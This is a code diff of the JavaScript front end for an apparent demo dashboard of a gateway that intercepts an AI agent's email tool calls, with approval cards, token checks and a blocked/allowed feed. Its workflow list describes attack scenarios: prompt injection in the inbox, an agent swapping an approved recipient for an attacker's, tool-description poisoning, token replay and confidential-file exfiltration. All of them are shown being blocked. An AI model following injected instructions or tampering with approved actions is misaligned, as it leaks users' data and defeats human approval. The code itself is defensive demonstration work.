+       <span class="gw-txid">${txId ? txId.slice(-8) : ''}</span>
+     </div>
+     <div class="gw-reason">${reason}</div>
+     ${fingerprint ? `<div class="gw-fingerprint">FP: ${fingerprint.slice(0,30)}…</div>` : ''}`);
+  prepend($('gateway-feed'), row);
+  const color = (decision==='ALLOW'||decision==='EXECUTED') ? 'green' : decision==='REQUIRE_APPROVAL' ? 'amber' : 'red';
+  animateIn(row, color);
+}
+
+function gwBlocked(reason, code, extra) {
+  txCount++;
+  updateStats('BLOCKED');
+  d3AddNode('BLOCKED', 'BLKD');
+  let extraHtml = '';
+  if (extra?.approved_to) extraHtml = `<div class="tamper-diff">
+    <span class="diff-approved">Approved: <b>${extra.approved_to}</b></span>
+    <span class="diff-arrow">→</span>
+    <span class="diff-attempted">Attempted: <b>${extra.attempted_to}</b></span></div>`;
+  if (extra?.replay) extraHtml = `<div class="replay-tag">Token already consumed on first use</div>`;
+  if (extra?.egress_protection) extraHtml = `
+    <div class="egress-block">
+      <span class="egress-label">DATA EGRESS BLOCKED</span>
+      <div class="egress-detail">File label: <b>${extra.file_label}</b> → attempted destination: <b>${extra.attempted_destination}</b></div>
+    </div>`;
+  const row = el('div', 'gw-row gw-block',
+    `<div class="gw-decision-line">
+       <span class="gw-icon">✗</span>
+       <span class="gw-decision">BLOCKED</span>
+       <span class="gw-code">${code||''}</span>
+     </div>
+     <div class="gw-reason">${reason}</div>${extraHtml}`);
+  prepend($('gateway-feed'), row);
+  animateIn(row, 'red');
+  shakeEl(row);
+}
+
+function gwExecuted(txId, to) {
+  updateStats('EXECUTED');
+  d3AddNode('EXECUTED', 'EXEC');
+  const row = el('div', 'gw-row gw-executed',
+    `<div class="gw-decision-line">
+       <span class="gw-icon">✓</span>
+       <span class="gw-decision">EXECUTED</span>
+       <span class="gw-txid">${txId ? txId.slice(-8) : ''}</span>
+     </div>
+     <div class="gw-reason">Email delivered → ${to}</div>`);
+  prepend($('gateway-feed'), row);
+  animateIn(row, 'green');
+}
+
+function showRegistryEvent(data) {
+  const row = el('div', `gw-row ${data.tampered ? 'gw-block' : 'gw-allow'}`,
+    `<div class="gw-decision-line">
+       <span class="gw-icon">${data.tampered ? '⚠' : '✓'}</span>
+       <span class="gw-decision">REGISTRY ${data.tampered ? 'DRIFT DETECTED' : data.restored ? 'RESTORED' : 'CLEAN'}</span>
+     </div>
+     <div class="gw-reason">${data.hash}</div>
+     ${data.injected ? `<div class="injected-tag">Injected: "${data.injected.slice(0,80)}…"</div>` : ''}`);
+  prepend($('gateway-feed'), row);
+  animateIn(row, data.tampered ? 'red' : 'green');
+  if (data.tampered) shakeEl(row);
+  d3AddNode(data.tampered ? 'BLOCKED' : 'ALLOW', data.tampered ? 'DRFT' : 'REG');
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Approval queue
+// ═══════════════════════════════════════════════════════════════════
+function showApprovalCard(data) {
+  pendingApproval = data;
+  $('approval-status').textContent = '1 pending';
+  const q = $('approval-queue');
+  q.innerHTML = `
+    <div class="approval-card" id="active-approval">
+      <div class="approval-header">
+        <span class="approval-badge">⚠ AWAITING YOUR APPROVAL</span>
+        <span class="approval-fp">FP: ${(data.fingerprint||'').slice(0,18)}…</span>
+      </div>
+      <dl class="approval-dl">
+        <dt>Recipient</dt><dd>${data.args.to || '?'}</dd>
+        <dt>Subject</dt><dd>${data.args.subject || '?'}</dd>
+        <dt>Attachment</dt><dd>📎 ${data.args.attachment || 'none'}</dd>
+        <dt>Transaction</dt><dd class="mono">${(data.transaction_id||'').slice(-12)}</dd>
+      </dl>
+      <p class="approval-warning">Any field change invalidates the token.</p>
+      <div class="approval-btns">
+        <button class="btn-approve" onclick="doApprove()">Approve exact action</button>
+        <button class="btn-reject" onclick="doReject()">Reject</button>
+      </div>
+    </div>`;
+  setBadge('needs-approval', 'AWAITING APPROVAL');
+  animateIn($('active-approval'), 'amber');
+  // Pulse the card
+  gsap.to($('active-approval'), { boxShadow: '0 0 20px rgba(210,153,34,0.4)', repeat: -1, yoyo: true, duration: 1 });
+}
+
+function clearApprovalCard() {
+  pendingApproval = null;
+  $('approval-status').textContent = 'idle';
+  gsap.killTweensOf($('active-approval'));
+  setIdle('approval-queue', 'No pending approvals.');
+  setBadge('active', 'GATEWAY ACTIVE');
+}
+
+async function doApprove() {
+  if (!pendingApproval) return;
+  const { transaction_id } = pendingApproval;
+  const approveBtns = document.querySelector('.btn-approve');
+  const rejectBtn   = document.querySelector('.btn-reject');
+  if (approveBtns) approveBtns.disabled = true;
+  if (rejectBtn)   rejectBtn.disabled   = true;
+  try {
+    const ap = await api('POST', `/transactions/${transaction_id}/approve`);
+    const card = $('active-approval');
+    if (card) {
+      card.className = 'approval-card approved-card';
+      card.querySelector('.approval-header').innerHTML =
+        `<span class="approval-badge approved-badge">✓ APPROVED</span>
+         <span class="approval-fp">Expires: ${new Date(ap.expires_at).toLocaleTimeString()}</span>`;
+      const btns = card.querySelector('.approval-btns');
+      if (btns) btns.remove();
+      gsap.to(card, { boxShadow: '0 0 20px rgba(63,185,80,0.4)', duration: .4 });
+    }
+    const inv = { server_id: 'mock-email-v1', tool_name: 'send_email', arguments: pendingApproval.args };
+    await api('POST', `/transactions/${transaction_id}/execute`, { invocation: inv, approval_token: ap.token });
+    gwExecuted(transaction_id, pendingApproval.args.to);
+    await loadSent();
+    clearApprovalCard();
+  } catch(e) {
+    const code = e.detail?.code || 'BLOCKED';
+    const msg  = e.detail?.message || JSON.stringify(e);
+    gwBlocked(msg, code);
+    if ($('active-approval')) shakeEl($('active-approval'));
+    clearApprovalCard();
+  }
+}
+
+async function doReject() {
+  if (!pendingApproval) return;
+  await api('POST', `/transactions/${pendingApproval.transaction_id}/reject`);
+  gwDecision('REJECTED', 'User rejected the transaction.', pendingApproval.transaction_id, '');
+  clearApprovalCard();
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Workflow runner
+// ═══════════════════════════════════════════════════════════════════
+const WORKFLOW_META = {
+  read_and_act:    { title: 'Read & Act', sub: 'Agent reads inbox → finds injected instruction → gateway blocks exfiltration' },
+  approval_tamper: { title: 'Approval Tampering', sub: 'User approves recipient → agent swaps to attacker → fingerprint mismatch' },
+  registry_tamper: { title: 'Tool Definition Poisoning', sub: 'Tool description poisoned after registration → registry drift detected' },
+  token_replay:    { title: 'Token Replay', sub: 'Approval token consumed on first use → rejected on second' },
+  file_exfil:      { title: 'File Exfiltration', sub: 'Agent reads confidential file → attempts to email it externally → data egress blocked' },
+};
+
+async function runWorkflow(wf) {
+  if (running) return;
+  running = true;
+  stats = { blocked: 0, allowed: 0, pending: 0 };
+  txCount = 0; txNodes.length = 0;
+  d3.select('#tx-graph').selectAll('*').remove();
+
+  const meta = WORKFLOW_META[wf];
+
+  // Animate header in
+  gsap.from('#workflow-title', { opacity: 0, y: -6, duration: .3 });
+  gsap.from('#workflow-sub',   { opacity: 0, y: -4, duration: .3, delay: .1 });
+  $('workflow-title').textContent = meta.title;
+  $('workflow-sub').textContent   = meta.sub;
+  $('tx-count').textContent = '0 transactions';
+  $('agent-status').textContent = 'running';
+  $('agent-feed').innerHTML   = '';
+  $('gateway-feed').innerHTML = '';
+  setIdle('approval-queue', 'No pending approvals.');
+  setIdle('sent-feed', 'No emails delivered yet.');
+  setBadge('active', 'GATEWAY ACTIVE');
+
+  document.querySelectorAll('.wf-btn').forEach(b => b.classList.remove('active'));
+  document.querySelector(`[data-wf="${wf}"]`).classList.add('active');
+
+  try { await api('POST', '/demo/reset'); await loadInbox(); await loadSent(); } catch {}
+
+  const resp = await fetch(API + '/agent/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ workflow: wf }),
+  });
+
+  const reader = resp.body.getReader();
+  const decoder = new TextDecoder();
+  let buffer = '';
+
+  while (true) {
+    const { done, value } = await reader.read();
+    if (done) break;
+    buffer += decoder.decode(value, { stream: true });
+    const lines = buffer.split('\n');
+    buffer = lines.pop();
+
+    for (const line of lines) {
+      if (!line.startsWith('data: ')) continue;
+      let event;
+      try { event = JSON.parse(line.slice(6)); } catch { continue; }
+      const { kind, data } = event;
+
+      await new Promise(r => setTimeout(r, 220));
+
+      if      (kind === 'think')            agentThink(data);
+      else if (kind === 'email')            agentEmail(data);
+      else if (kind === 'tool_call')        agentToolCall(data.tool, data.args);
+      else if (kind === 'filesystem_list')  agentFsList(data.entries);
+      else if (kind === 'file_read')        agentFileRead(data);
+      else if (kind === 'gateway') {
+        gwDecision(data.decision, data.reason, data.transaction_id, data.fingerprint);
+        if (data.decision === 'REQUIRE_APPROVAL')
+          showApprovalCard({ transaction_id: data.transaction_id,
+                             fingerprint: data.fingerprint, args: data.args || {} });
+      }
+      else if (kind === 'approval_requested')
+        showApprovalCard({ transaction_id: data.transaction_id,
+                           fingerprint: data.fingerprint, args: data.args || {} });
+      else if (kind === 'approved')
+        agentThink(`Token issued — expires ${new Date(data.expires_at).toLocaleTimeString()}`);
+      else if (kind === 'executed') {
+        gwExecuted(data.transaction_id, data.to);
+        await loadSent();
+        if (pendingApproval) clearApprovalCard();
+      }
+      else if (kind === 'blocked') {
+        gwBlocked(data.reason, data.code, data);
+        if (pendingApproval) clearApprovalCard();
+      }
+      else if (kind === 'registry_status') showRegistryEvent(data);
+      else if (kind === 'done') break;
+      else if (kind === 'error') gwBlocked(data.message, 'ERROR');
+    }
+  }
+
+  $('agent-status').textContent = 'done';
+  setBadge('idle', 'GATEWAY IDLE');
+  running = false;
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Reset
+// ═══════════════════════════════════════════════════════════════════
+$('btn-reset').addEventListener('click', async () => {
+  if (running) return;
+  gsap.to('.sidebar', { x: -4, duration: .08, yoyo: true, repeat: 1 });
+  await api('POST', '/demo/reset');
+  $('agent-feed').innerHTML   = '';
+  $('gateway-feed').innerHTML = '';
+  setIdle('agent-feed',    'Run a workflow to watch the agent act in real time.');
+  setIdle('gateway-feed',  'Every tool call is intercepted here before execution.');
+  setIdle('approval-queue','No pending approvals.');
+  setIdle('sent-feed',     'No emails delivered yet.');
+  setIdle('fs-feed',       'Run File Exfiltration workflow to see files.');
+  txCount = 0; sentCount = 0;
+  stats = { blocked:0, allowed:0, pending:0 };
+  txNodes.length = 0;
+  d3.select('#tx-graph').selectAll('*').remove();
+  ['stat-blocked','stat-allowed','stat-pending'].forEach(id => $(id).textContent = '0');
+  $('tx-count').textContent = '0 transactions';
+  $('sent-count').textContent = '0';
+  $('mailbox-count').textContent = '0 sent';
+  $('workflow-title').textContent = 'Select a workflow';
+  $('workflow-sub').textContent   = 'Choose from the sidebar to watch the agent run live';
+  $('agent-status').textContent   = 'waiting';
+  $('approval-status').textContent = 'idle';
+  setBadge('idle', 'GATEWAY IDLE');
+  document.querySelectorAll('.wf-btn').forEach(b => b.classList.remove('active'));
+  pendingApproval = null;
+  await loadInbox();
 });
 
-$('#approve').onclick = approve;
-$('#reject').onclick = async () => {
-  if (active) {
-    await request(`/transactions/${active.id}/reject`, { method: 'POST' });
-    setState('danger', 'Rejected', 'The user rejected the proposed transaction.');
-    steps(2, true);
-    await loadAudit();
-  }
-};
-$('#reset').onclick = reset;
+// ═══════════════════════════════════════════════════════════════════
+//  Wire buttons & init
+// ═══════════════════════════════════════════════════════════════════
+document.querySelectorAll('.wf-btn').forEach(btn =>
+  btn.addEventListener('click', () => runWorkflow(btn.dataset.wf))
+);
 
-// ─── Init ─────────────────────────────────────────────────────────────────────
-refreshMailbox();
+// Initial entrance animation
+gsap.from('.sidebar', { x: -20, opacity: 0, duration: .5, ease: 'power2.out' });
+gsap.from('.topbar',  { y: -10, opacity: 0, duration: .4, delay: .1 });
+gsap.from('.col',     { opacity: 0, y: 10, stagger: .1, duration: .4, delay: .2 });
+
+loadInbox();
+loadSent();
